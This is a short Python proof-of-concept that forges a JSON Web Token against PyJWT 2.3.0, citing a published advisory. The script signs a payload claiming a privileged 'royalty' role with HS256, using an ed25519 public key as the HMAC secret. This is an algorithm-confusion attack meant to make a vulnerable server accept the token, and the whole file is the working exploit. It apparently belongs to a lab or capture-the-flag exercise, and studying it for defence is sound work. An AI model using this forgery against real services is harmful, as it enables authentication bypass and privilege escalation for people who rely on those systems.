# PyJWT==2.3.0
# credits: https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24
import datetime
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519


payload = {
    "ROLE": "royalty",
    "CURRENT_DATE": f"03_07_1341_BC"
}
# Get public key bytes as they would be stored in a file

pub_key_bytes = b'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2'

# Using HMAC with the public key to trick the receiver to think that the 

encoded_bad = jwt.encode(payload, pub_key_bytes, algorithm="HS256")
print(encoded_bad)